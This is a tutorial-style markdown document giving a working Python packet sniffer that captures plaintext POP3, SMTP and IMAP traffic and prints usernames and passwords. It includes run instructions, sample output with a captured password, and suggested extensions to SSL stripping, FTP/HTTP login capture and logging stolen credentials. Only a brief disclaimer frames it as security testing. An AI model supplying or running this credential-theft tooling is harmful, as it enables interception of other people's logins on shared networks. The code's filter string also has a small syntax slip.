# **Email Credential Sniffer in Python**  

This script **captures email-related network traffic** and extracts potential **username** and **password** data from unencrypted connections.  

```python
from kamene.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = bytes(packet[TCP].payload)
        if b"user" in mail_packet.lower() or b"pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst}")
            print(f"[*] {packet[TCP].payload}")

sniff(filter="tcp port 110 or tcp 25 or tcp port 143", prn=packet_callback, store=0)
```


---

## **1. How It Works**  
- Uses **Kamene** (a fork of Scapy) to sniff packets.  
- Listens on common email ports:  
  - **Port 110** (POP3 - Receiving email).  
  - **Port 25** (SMTP - Sending email).  
  - **Port 143** (IMAP - Receiving email).  
- Extracts **TCP payloads** and checks for **"user"** or **"pass"** in plaintext.  
- Displays the **server IP** and captured credentials.  

---

## **2. Code Breakdown**  

### **Importing Kamene (Scapy Alternative)**  
```python
from kamene.all import *
```
- **Kamene** is a Scapy fork that avoids conflicts with Python’s networking stack.  
- If you don't have Kamene, install it using:  
  ```sh
  pip install kamene
  ```

---

### **Defining the Packet Handler**  
```python
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = bytes(packet[TCP].payload)
        if b"user" in mail_packet.lower() or b"pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst}")
            print(f"[*] {packet[TCP].payload}")
```
- **Checks if the TCP packet has a payload** (actual data).  
- Converts the payload to **bytes** for processing.  
- Searches for **"user"** or **"pass"** (case-insensitive) in the captured data.  
- If found, prints:  
  - **Server IP** (destination address).  
  - **The actual captured credentials**.  

---

### **Starting the Sniffer**  
```python
sniff(filter="tcp port 110 or tcp 25 or tcp port 143", prn=packet_callback, store=0)
```
- Captures **TCP traffic** on email-related ports.  
- Calls `packet_callback()` for each intercepted packet.  
- Does **not store** packets in memory (`store=0` for efficiency).  

---

## **3. How to Run the Sniffer**  

### **Prerequisites**  
- **Python 3.x**  
- **Kamene library** (`pip install kamene`)  
- **Root/Administrator privileges** (required for sniffing network traffic)  

### **Steps to Run**  

#### **On Linux/macOS**  
```sh
sudo python3 email_sniffer.py
```

#### **On Windows**  
1. Run **Command Prompt** as Administrator.  
2. Execute:  
   ```sh
   python email_sniffer.py
   ```

---

## **4. Expected Output Example**  

```sh
[*] Server: 192.168.1.10
[*] b'USER johndoe\r\n'
[*] Server: 192.168.1.10
[*] b'PASS secret123\r\n'
```
- Captures **username** and **password** from unencrypted email traffic.  

---

## **5. Limitations & Ethical Considerations**  
⚠ **Warning: This script should only be used for ethical testing on networks you own or have permission to monitor. Unauthorized packet sniffing is illegal in many jurisdictions.**  

### **Limitations**  
- **Only works on unencrypted email traffic.**  
- Modern email services use **SSL/TLS encryption** (e.g., **SMTP over port 465, IMAP over port 993**), which this script **cannot decrypt**.  

---

## **6. Enhancements**  
✅ **Support SSL/TLS decryption** using `mitmproxy` or `SSLStrip`.  
✅ **Expand to capture FTP (`port 21`) or HTTP (`port 80`) logins.**  
✅ **Log captured credentials** to a file for further analysis.  

---

## **7. Conclusion**  
- This script is a **basic email credential sniffer** for unencrypted email protocols.  
- Useful for **network security testing** but **not effective against encrypted connections**.  
